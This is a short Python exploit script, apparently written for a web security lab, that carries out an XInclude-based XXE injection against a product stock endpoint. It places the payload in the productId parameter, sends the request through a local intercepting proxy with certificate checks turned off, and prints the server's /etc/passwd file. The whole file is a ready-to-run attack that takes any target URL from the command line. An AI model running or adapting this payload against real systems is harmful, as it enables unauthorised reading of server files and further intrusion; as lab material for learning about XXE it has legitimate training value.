import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'
}

def exploit_xxe(s, url):

    print("(+) Exploiting XXE Injection...")
    stock_url = url + "/product/stock"
    data_stock = {'productId': '1<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>', 'storeId': '1'}
    r = s.post(stock_url, data=data_stock, verify=False, proxies=proxies)
    print("(+) The following is the content of the /etc/passwd file:")
    print(r.text)


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    exploit_xxe(s, url)

if __name__ == "__main__":
    main()